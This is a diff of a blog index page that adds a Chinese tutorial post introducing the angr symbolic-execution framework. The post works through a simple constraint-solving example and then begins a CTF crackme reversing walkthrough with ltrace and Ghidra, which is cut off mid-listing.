@@ -114,6 +114,322 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2021/06/26/Angr初探/" >Angr初探</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2021-06-26  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+
+		
+        
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+		
+            
+            <p class="post">&lt;h2 id=&#34;一、介绍&#34;&gt;&lt;a href=&#34;#一、介绍&#34; class=&#34;headerlink&#34; title=&#34;一、介绍&#34;&gt;&lt;/a&gt;一、介绍&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;首先我将简要介绍一下Angr，因为我认为知道我们的工具如何工作是很重要的一件事情。
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;二、符号执行-简要介绍&#34;&gt;&lt;a href=&#34;#二、符号执行-简要介绍&#34; class=&#34;headerlink&#34; title=&#34;二、符号执行 - 简要介绍&#34;&gt;&lt;/a&gt;二、符号执行 - 简要介绍&lt;/h2&gt;&lt;p&gt;Angr是一个python模块的，我将使用它作为二进制分析的框架。它是采用动态和静态结合的方式来进行符号分析的工作。这种工作方式被叫做“导向性随机测试”，虽然如此，但是大家基本叫它符号执行/分析引擎。&lt;/p&gt;
+&lt;h3 id=&#34;什么是符号执行？&#34;&gt;&lt;a href=&#34;#什么是符号执行？&#34; class=&#34;headerlink&#34; title=&#34;什么是符号执行？&#34;&gt;&lt;/a&gt;什么是符号执行？&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;符号执行就是通过用“符号”值替换程序的输入值来模拟程序的执行。随着执行模拟的进行，每当处理输入时，执行程序的约束条件都会被添加到“符号”值中。 当遇到分支条件时，模拟分为两条路径：一条路径分支条件评估为真，另一条路径评估为假。
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;通俗的说，就是用符号去替换输入的值。用符号值执行程序会建立起约束的边界。&lt;br&gt;看下面的一个例子：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;// Assume a &amp;amp; b are controlled by the user&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if (a &amp;gt; b)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  a = a - b;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;else b = b - a;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;也就是说，左分支的约束是 a&amp;gt;b，而右分支的约束是 a&amp;lt;=b。&lt;/p&gt;
+&lt;p&gt;真实世界的程序肯定不会如此简单，代码分支深处的约束会变得非常大、非常快。为了解决这些限制，Angr使用了微软的定理证明器Z3。Z3检查约束是否可满足 (SAT)。假设某个分支有可满足的约束，我们可以要求Angr给出一个满足约束的输入的例子。&lt;/p&gt;
+&lt;h2 id=&#34;三、Angr-基础使用&#34;&gt;&lt;a href=&#34;#三、Angr-基础使用&#34; class=&#34;headerlink&#34; title=&#34;三、Angr - 基础使用&#34;&gt;&lt;/a&gt;三、Angr - 基础使用&lt;/h2&gt;&lt;p&gt;下面是一个Angr基础使用的用法示例。在下面的例子中，我们将会添加约束条件，并让Angr去执行它。&lt;br&gt;考虑下面的代码片段：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;void main(int argc, char *argv[])&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int a=atoi(argv[1]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int b=atoi(argv[2]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if (10 &amp;gt; a &amp;amp;&amp;amp; a &amp;gt; 5 &amp;amp;&amp;amp; 10 &amp;gt; b &amp;amp;&amp;amp; b &amp;gt; 1 &amp;amp;&amp;amp; 2*b - a == 10)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        printf(&amp;quot;[+] Math is hard... but not 4 u! \n&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;我们将会使用Angr手工的加上约束条件，然后使用内置的求解器（solver）进行求解。这与我们通常使用Angr的方式不同，它只是在我们深入研究复杂案例之前展示一下的例子。&lt;/p&gt;
+&lt;p&gt;带上注释一步一步的用iPython命令，&lt;/p&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# Importing angr&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;In [&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]: &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; angr &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# A wrapper for Z3. Claripy is used for constraint-solving.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;In [&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]: &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; claripy &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# Loading the binary to angr. &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;In [&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;]: p = angr.Project(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./a.out&amp;#x27;&lt;/span&gt;) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;WARNING | &lt;span class=&#34;number&#34;&gt;2021&lt;/span&gt;-05-&lt;span class=&#34;number&#34;&gt;24&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;17&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;54&lt;/span&gt;:05,&lt;span class=&#34;number&#34;&gt;450&lt;/span&gt; | cle.loader | The main binary &lt;span class=&#34;keyword&#34;&gt;is&lt;/span&gt; a position-independent executable. It &lt;span class=&#34;keyword&#34;&gt;is&lt;/span&gt; being loaded &lt;span class=&#34;keyword&#34;&gt;with&lt;/span&gt; a base address of &lt;span class=&#34;number&#34;&gt;0x400000&lt;/span&gt;.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# Constructs a state ready to execute at the binary&amp;#x27;s entry point.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;In [&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;]: state = p.factory.entry_state() &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# Create a bitvector symbol named &amp;quot;a&amp;quot; of length 32 bits&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;In [&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;]: a = state.solver.BVS(&lt;span class=&#34;string&#34;&gt;&amp;quot;a&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# Create a bitvector symbol named &amp;quot;b&amp;quot; of length 32 bits&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;In [&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;]: b = state.solver.BVS(&lt;span class=&#34;string&#34;&gt;&amp;quot;b&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27; Adding constraints manually &amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;In [&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;]: state.solver.add(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;&amp;gt;a) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Out[&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;]: [&amp;lt;Bool a_39_32 &amp;lt; &lt;span class=&#34;number&#34;&gt;0xa&lt;/span&gt;&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;In [&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;]: state.solver.add(a&amp;gt;&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Out[&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;]: [&amp;lt;Bool a_39_32 &amp;gt; &lt;span class=&#34;number&#34;&gt;0x5&lt;/span&gt;&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;In [&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;]: state.solver.add(b&amp;gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Out[&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;]: [&amp;lt;Bool b_40_32 &amp;gt; &lt;span class=&#34;number&#34;&gt;0x1&lt;/span&gt;&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;In [&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;]: state.solver.add(b&amp;lt;&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Out[&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;]: [&amp;lt;Bool b_40_32 &amp;lt; &lt;span class=&#34;number&#34;&gt;0xa&lt;/span&gt;&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;In [&lt;span class=&#34;number&#34;&gt;11&lt;/span&gt;]: state.solver.add(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;*b - a == &lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Out[&lt;span class=&#34;number&#34;&gt;11&lt;/span&gt;]: [&amp;lt;Bool &lt;span class=&#34;number&#34;&gt;0x2&lt;/span&gt; * b_40_32 - a_39_32 == &lt;span class=&#34;number&#34;&gt;0xa&lt;/span&gt;&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# Evaluates the value of &amp;quot;a&amp;quot; by taking the current constraints into consideration.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;In [&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;]: state.solver.&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(a)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Out[&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;]: &lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# Evaluates the value of &amp;quot;b&amp;quot; by taking the current constraints into consideration.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;In [&lt;span class=&#34;number&#34;&gt;13&lt;/span&gt;]: state.solver.&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(b)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Out[&lt;span class=&#34;number&#34;&gt;13&lt;/span&gt;]: &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;现在我们有了这些基础之后，让我们转到主要的事情上：&lt;/p&gt;
+&lt;h2 id=&#34;四、逆向混淆的二进制文件&#34;&gt;&lt;a href=&#34;#四、逆向混淆的二进制文件&#34; class=&#34;headerlink&#34; title=&#34;四、逆向混淆的二进制文件&#34;&gt;&lt;/a&gt;四、逆向混淆的二进制文件&lt;/h2&gt;&lt;p&gt;我们使用的二进制文件是“&lt;a href=&#34;https://ctftime.org/event/1118&#34;&gt;DarkCTF2020&lt;/a&gt;”的“&lt;a href=&#34;https://napongizero.github.io/blog/assets/Defeating-Code-Obfuscation-with-Angr/jack&#34;&gt;Jack&lt;/a&gt;”&lt;/p&gt;
+&lt;h3 id=&#34;文件分析&#34;&gt;&lt;a href=&#34;#文件分析&#34; class=&#34;headerlink&#34; title=&#34;文件分析&#34;&gt;&lt;/a&gt;文件分析&lt;/h3&gt;&lt;p&gt;首先收集一些二进制文件的基础信息：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ file ./jack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./jack: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f530c71efca944a196fe383afcd8df60591edf78, for GNU/Linux 3.2.0, not stripped&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;执行下文件，并且使用ltrace去trace写库函数。&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ ltrace ./jack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts(&amp;quot;Enter your key: &amp;quot;Enter your key: &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;)                         = 17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fgets(adf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;adf\n&amp;quot;, 17, 0x7f8f337f0a00)               = 0x7ffd58fe1040&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;strlen(&amp;quot;adf\n&amp;quot;)                                  = 4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts(&amp;quot;Try Harder&amp;quot;Try Harder&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;)                               = 11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts(&amp;quot;bye&amp;quot;bye&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;)                                      = 4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+++ exited (status 1) +++&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;这为我们提供了一些关于我们面对的问题的有用的信息。&lt;br&gt;看来问题是找到程序的key（可能不止一个）。&lt;br&gt;接下来，我决定在 Ghidra 中加载二进制文件，以便更好地了解发生了什么。&lt;/p&gt;
+&lt;p&gt;反编译主程序：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span 